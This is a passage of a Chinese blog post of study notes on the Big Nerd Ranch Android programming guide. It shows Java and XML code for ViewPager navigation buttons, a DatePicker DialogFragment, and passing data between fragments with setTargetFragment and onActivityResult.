class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"32dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Jump to Last"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"@+id/activity_crime_pager_view_pager"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">android.support.constraint.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>修改CrimePagerActivity绑定两个按钮并设置点击事件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimePagerActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    ···</span><br><span class="line">    <span class="keyword">private</span> Button mFirstButton;</span><br><span class="line">    <span class="keyword">private</span> Button mLastButton;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(@Nullable Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        ···</span><br><span class="line">        mFirstButton = findViewById(R.id.btn_first);</span><br><span class="line">        mFirstButton.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        mLastButton = findViewById(R.id.btn_last);</span><br><span class="line">        mLastButton.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ···</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_first:</span><br><span class="line">                mViewPager.setCurrentItem(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_last:</span><br><span class="line">                mViewPager.setCurrentItem(mCrimes.size() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>给mViewPager添加页面监听：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mViewPager.addOnPageChangeListener(<span class="keyword">new</span> ViewPager.OnPageChangeListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPageScrolled</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">float</span> v, <span class="keyword">int</span> i1)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPageSelected</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        mLastButton.setVisibility(View.VISIBLE);</span><br><span class="line">        mFirstButton.setVisibility(View.VISIBLE);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">            mFirstButton.setVisibility(View.GONE);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == mCrimes.size() - <span class="number">1</span>) &#123;</span><br><span class="line">            mLastButton.setVisibility(View.GONE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPageScrollStateChanged</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>运行效果</p><p>| 滑至第一项                                                   | 滑至中间项                                                   | 滑至最后项                                                   |<br>| ———————————————————— | ———————————————————— | ———————————————————— |<br>| <img src="/2020/03/30/Android编程权威指南学习笔记三/4.png" alt="image-20200401180032779" style="zoom: 50%;"> | <img src="/2020/03/30/Android编程权威指南学习笔记三/5.png" alt="image-20200401180251078" style="zoom: 50%;"> | <img src="/2020/03/30/Android编程权威指南学习笔记三/6.png" alt="image-20200401180315199" style="zoom: 50%;"> |</p></li></ol><h1 id="第十二章-对-话-框"><a href="#第十二章-对-话-框" class="headerlink" title="第十二章 对 话 框"></a>第十二章 对 话 框</h1><h2 id="创建-DialogFragment"><a href="#创建-DialogFragment" class="headerlink" title="创建 DialogFragment"></a>创建 DialogFragment</h2><p>使用<code>FragmentManager</code>管理对话框，可以更灵活地显示对话框</p><p>如果旋转设备，单独使用的AlertDialog会消失，而封装在fragment中的AlertDialog则不会有此问题（旋转后，对话框会被重建恢复）</p><p>要显示对话框，首先应完成以下任务：</p><ul><li>创建DatePickerFragment类；</li><li>创建AlertDialog；</li><li>借助FragmentManager在屏幕上显示对话框</li></ul><p>创建DatePickerFragment新类，并设置其DialogFragment超类为支持库中的<code>android.support.v4.app.DialogFragment</code>类。</p><p>DialogFragment类有如下方法：</p><p><code>public Dialog onCreateDialog(Bundle savedInstanceState)</code></p><p>为了在屏幕上显示DialogFragment，托管activity的FragmentManager会调用它</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatePickerFragment</span> <span class="keyword">extends</span> <span class="title">DialogFragment</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dialog <span class="title">onCreateDialog</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> AlertDialog.Builder(getActivity())</span><br><span class="line">        .setTitle(R.string.date_picker_title)</span><br><span class="line">        .setPositiveButton(android.R.string.ok, <span class="keyword">null</span>)</span><br><span class="line">        .create();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用setPositiveButton(…)方法，需传入两个参数：字符串资源和实现<code>DialogInterface.OnClickListener</code>接口的对象。（Android有3种可用于对话框的按钮： positive按钮、 negative按钮以及neutral按钮。用户点击positive按钮接受对话框展现信息。如果同一对话框上放置有多个按钮，按钮的类型与命名决定着它们在对话框上显示的位置。）。最后，调用AlertDialog.Builder.create()方法，返回配置完成的AlertDialog实例，完成对话框的创建</p><h3 id="显示-DialogFragment"><a href="#显示-DialogFragment" class="headerlink" title="显示 DialogFragment"></a>显示 DialogFragment</h3><p>要将DialogFragment添加给FragmentManager管理并放置到屏幕上，可调用fragment实例的以下方法：</p><p><code>public void show(FragmentManager manager, String tag)</code><br><code>public void show(FragmentTransaction transaction, String tag)</code></p><p>String参数可唯一识别FragmentManager队列中的DialogFragment。两个方法都可以：如果传入FragmentTransaction参数，你自己负责创建并提交事务；如果传入FragmentManager参数，系统会自动创建并提交事务</p><p>在CrimeFragment中，为DatePickerFragment添加一个tag常量。为mDateButton按钮添加OnClickListener监听器接口，实现点击日期按钮展现DatePickerFragment界面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeFragment</span> <span class="keyword">extends</span> <span class="title">Fragment</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ARG_CRIME_ID = <span class="string">"crime_id"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DIALOG_DATE = <span class="string">"DialogDate"</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">onCreateView</span><span class="params">(LayoutInflater inflater, ViewGroup container,</span></span></span><br><span class="line"><span class="function"><span class="params">    Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        mDateButton = (Button) v.findViewById(R.id.crime_date);</span><br><span class="line">        mDateButton.setText(mCrime.getDate().toString());</span><br><span class="line">        mDateButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            FragmentManager manager = getFragmentManager();</span><br><span class="line">            DatePickerFragment dialog = <span class="keyword">new</span> DatePickerFragment();</span><br><span class="line">            dialog.show(manager, DIALOG_DATE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    mSolvedCheckBox = (CheckBox) v.findViewById(R.id.crime_solved);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="设置对话框的显示内容"><a href="#设置对话框的显示内容" class="headerlink" title="设置对话框的显示内容"></a>设置对话框的显示内容</h3><p>使用<code>AlertDialog.Builder的setView(...)</code>方法，给AlertDialog对话框添加DatePicker组件:</p><p><code>public AlertDialog.Builder setView(View view)</code></p><p>该方法配置对话框，实现在标题栏与按钮之间显示传入的View对象</p><p>在项目工具窗口中，以DatePicker为根元素，创建名为dialog_date.xml的布局文件。新布局仅包含一个View对象，即我们生成并传给setView(…)方法的DatePicker视图</p><p><img src="/2020/03/30/Android编程权威指南学习笔记三/7.png" alt="7"></p><p>在DatePickerFragment.onCreateDialog(Bundle)方法中，实例化DatePicker视图并添<br>加给对话框:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Dialog <span class="title">onCreateDialog</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    View v = LayoutInflater.from(getActivity())</span><br><span class="line">        .inflate(R.layout.dialog_date, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> AlertDialog.Builder(getActivity())</span><br><span class="line">        .setView(v)</span><br><span class="line">        .setTitle(R.string.date_picker_title)</span><br><span class="line">        .setPositiveButton(android.R.string.ok, <span class="keyword">null</span>)</span><br><span class="line">        .create();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序，会显示如下界面。如果使用旧版本系统 ，DatePicker组件会使用<code>calendarViewShown</code>属性，显示图12-7：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记三/8.png" alt="8"></p><p>至此，显示对话框的工作就完成了。下一节，我们实现显示Crime日期，并支持用户对其进行修改</p><h2 id="fragment-间的数据传递"><a href="#fragment-间的数据传递" class="headerlink" title="fragment 间的数据传递"></a>fragment 间的数据传递</h2><p>前面，我们实现了activity之间以及基于fragment的activity之间的数据传递。现在需实现同一activity托管的两个fragment之间的数据传递</p><p>要传递crime的日期给DatePickerFragment，需新建一个newInstance(Date)方法，然后将Date作为argument附加给fragment。为返回新日期给CrimeFragment，并更新模型层以及对应视图，需将日期打包为extra并附加到Intent上，然后调用CrimeFragment.onActivityResult(…)方法，并传入准备好的Intent参数</p><h3 id="传递数据给-DatePickerFragment"><a href="#传递数据给-DatePickerFragment" class="headerlink" title="传递数据给 DatePickerFragment"></a>传递数据给 DatePickerFragment</h3><p>要传递crime日期给DatePickerFragment，需将它保存在DatePickerFragment的argument bundle中。这样， DatePickerFragment就能直接获取它。</p><p>创建和设置fragment argument通常是在newInstance()方法中完成的（代替fragment构造方法）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatePickerFragment</span> <span class="keyword">extends</span> <span class="title">DialogFragment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ARG_DATE = <span class="string">"date"</span>;</span><br><span class="line">    <span class="keyword">private</span> DatePicker mDatePicker;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DatePickerFragment <span class="title">newInstance</span><span class="params">(Date date)</span> </span>&#123;</span><br><span class="line">        Bundle args = <span class="keyword">new</span> Bundle();</span><br><span class="line">        args.putSerializable(ARG_DATE, date);</span><br><span class="line">        DatePickerFragment fragment = <span class="keyword">new</span> DatePickerFragment();</span><br><span class="line">        fragment.setArguments(args);</span><br><span class="line">        <span class="keyword">return</span> fragment;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然 后 ， 在 CrimeFragment 中 ， 用 DatePickerFragment.newInstance(Date) 方 法 替 换DatePickerFragment的构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mDateButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        FragmentManager manager = getFragmentManager()</span><br><span class="line">        DatePickerFragment dialog = <span class="keyword">new</span> DatePickerFragment();</span><br><span class="line">        DatePickerFragment dialog = DatePickerFragment</span><br><span class="line">            .newInstance(mCrime.getDate());</span><br><span class="line">        dialog.show(manager, DIALOG_DATE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>DatePickerFragment使用Date中的信息来初始化DatePicker对象。然而， DatePicker对象的初始化需整数形式的月、日、年。 Date是时间戳，无法直接提供整数</p><p>要达到目的，必须首先创建一个Calendar对象，然后用Date对象配置它，再从Calendar对象中取回所需信息</p><p>在onCreateDialog(Bundle)方法内，从argument中获取Date对象，然后用它和Calendar对象初始化DatePicker：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Dialog <span class="title">onCreateDialog</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    Date date = (Date) getArguments().getSerializable(ARG_DATE);</span><br><span class="line">    Calendar calendar = Calendar.getInstance();</span><br><span class="line">    calendar.setTime(date);</span><br><span class="line">    <span class="keyword">int</span> year = calendar.get(Calendar.YEAR);</span><br><span class="line">    <span class="keyword">int</span> month = calendar.get(Calendar.MONTH);</span><br><span class="line">    <span class="keyword">int</span> day = calendar.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">    View v = LayoutInflater.from(getActivity())</span><br><span class="line">    .inflate(R.layout.dialog_date, <span class="keyword">null</span>);</span><br><span class="line">    mDatePicker = (DatePicker) v.findViewById(R.id.dialog_date_picker);</span><br><span class="line">    mDatePicker.init(year, month, day, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> AlertDialog.Builder(getActivity())</span><br><span class="line">        .setView(v)</span><br><span class="line">        .setTitle(R.string.date_picker_title)</span><br><span class="line">        .setPositiveButton(android.R.string.ok, <span class="keyword">null</span>)</span><br><span class="line">        .create();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="返回数据给-CrimeFragment"><a href="#返回数据给-CrimeFragment" class="headerlink" title="返回数据给 CrimeFragment"></a>返回数据给 CrimeFragment</h3><p>要让CrimeFragment接收DatePickerFragment返回的日期数据，首先需要清楚它们之间的关系。<br>如果是activity的数据回传，我们调用startActivityForResult(…)方法， ActivityManager负责跟踪管理activity父子关系。回传数据后，子activity被销毁，但ActivityManager知道接收数据的是哪个activity。  </p><ol><li><p>设置目标fragment</p><p>类似于activity间的关联，可将CrimeFragment设置成DatePickerFragment的目标fragment。<br>这样，在CrimeFragment和DatePickerFragment被销毁并重建后，操作系统会重新关联它们。<br>调用以下Fragment方法可建立这种关联：  </p><p><code>public void setTargetFragment(Fragment fragment, int requestCode)</code></p><p>该方法有两个参数：目标fragment以及类似于传入startActivityForResult(…)方法的请求代码</p><p>目标fragment和请求代码由FragmentManager负责跟踪管理，我们可调用fragment（设置目标fragment的fragment）的getTargetFragment()方法和getTargetRequestCode()方法获取它们</p><p>在CrimeFragment.java中，创建请求代码常量，然后将CrimeFragment设为DatePickerFragment实例的目标fragment:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeFragment</span> <span class="keyword">extends</span> <span class="title">Fragment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ARG_CRIME_ID = <span class="string">"crime_id"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DIALOG_DATE = <span class="string">"DialogDate"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> REQUEST_DATE = <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">onCreateView</span><span class="params">(LayoutInflater inflater, ViewGroup container,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        mDateButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                FragmentManager manager = getFragmentManager();</span><br><span class="line">                DatePickerFragment dialog = DatePickerFragment</span><br><span class="line">                    .newInstance(mCrime.getDate());</span><br><span class="line">                dialog.setTargetFragment(CrimeFragment.<span class="keyword">this</span>, REQUEST_DATE);</span><br><span class="line">                dialog.show(manager, DIALOG_DATE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>传递数据给目标fragment</p><p>建立CrimeFragment与DatePickerFragment之间的联系后，需将数据回传给CrimeFragment。回传日期将作为extra附加给Intent</p><p>使 用 什 么 方 法 发 送 intent 信 息 给 目 标 fragment ？ 虽 然 令 人 难 以 置 信 ， 但 是 我 们 会 让DatePickerFragment类调用<code>CrimeFragment.onActivityResult(int, int, Intent)</code>方法</p><p><code>Activity.onActivityResult(...)</code>方法是ActivityManager在子activity被销毁后调用的父activity方法。处理activity间的数据返回时， ActivityManager会自动调用<code>Activity.onActivityResult(...)</code>方法。父activity接收到<code>Activity.onActivityResult(...)</code>方法调用命令后，其FragmentManager会调用对应fragment的<code>Fragment.onActivityResult(...)</code>方法</p><p>处理由同一activity托管的两个fragment间的数据返回时，可借用Fragment.onActivityResult(…)方法。因此，直接调用目标fragment的<code>Fragment.onActivityResult(...)</code>方法，就能实现数据的回传</p><p>在DatePickerFragment类中，新建<code>sendResult(...)</code>私有方法，创建intent并将日期数据作为extra附加到intent上。最后调用<code>CrimeFragment.onActivityResult(...)</code>方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatePickerFragment</span> <span class="keyword">extends</span> <span class="title">DialogFragment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String EXTRA_DATE = <span class="string">"com.bignerdranch.android.criminalintent.date"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ARG_DATE = <span class="string">"date"</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dialog <span class="title">onCreateDialog</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendResult</span><span class="params">(<span class="keyword">int</span> resultCode, Date date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getTargetFragment() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.putExtra(EXTRA_DATE, date);</span><br><span class="line">        getTargetFragment().onActivityResult(getTargetRequestCode(), resultCode, intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在来使用sendResult(…)私有方法。用户点击对话框中的positive按钮时，需要从DatePicker中获取日期并回传给CrimeFragment。在onCreateDialog(…)方法中，替换掉setPositiveButton(…)的null参数值，实现DialogInterface.OnClickListener监听器接口。在监听器接口的onClick(…)方法中，获取日期并调用sendResult(…)方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Dialog <span class="title">onCreateDialog</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> AlertDialog.Builder(getActivity())</span><br><span class="line">    .setView(v)</span><br><span class="line">    .setTitle(R.string.date_picker_title)</span><br><span class="line">    .setPositiveButton(android.R.string.ok, <span class="keyword">null</span>);</span><br><span class="line">    .setPositiveButton(android.R.string.ok,</span><br><span class="line">        <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> year = mDatePicker.getYear();</span><br><span class="line">            <span class="keyword">int</span> month = mDatePicker.getMonth();</span><br><span class="line">            <span class="keyword">int</span> day = mDatePicker.getDayOfMonth();</span><br><span class="line">            Date date = <span class="keyword">new</span> GregorianCalendar(year, month, day).getTime();</span><br><span class="line">            sendResult(Activity.RESULT_OK, date);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .create();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在CrimeFragment中，覆盖onActivityResult(…)方法，从extra中获取日期数据，设置对应Crime的记录日期，然后刷新日期按钮的显示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeFragment</span> <span class="keyword">extends</span> <span class="title">Fragment</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">onCreateView</span><span class="params">(LayoutInflater inflater, ViewGroup container,Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (resultCode != Activity.RESULT_OK) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (requestCode == REQUEST_DATE) &#123;</span><br><span class="line">            Date date = (Date) data</span><br><span class="line">            .getSerializableExtra(DatePickerFragment.EXTRA_DATE);</span><br><span class="line">            mCrime.setDate(date);</span><br><span class="line">            mDateButton.setText(mCrime.getDate().toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在onCreateView(…)和onActivityResult(…)这两个方法中，设置按钮显示文字的代码完全一样。为了避免代码冗余，可以将其封装到updateDate()私有方法中，然后分别调用。除 手 动 封 装 代 码 的 方 式 外 ， 还 可 以 使 用 Android Studio 的 内 置 工 具 。 高 亮 选 取 设 置mDateButton显示文字的代码 →右键单击并选择Refactor → Extract → 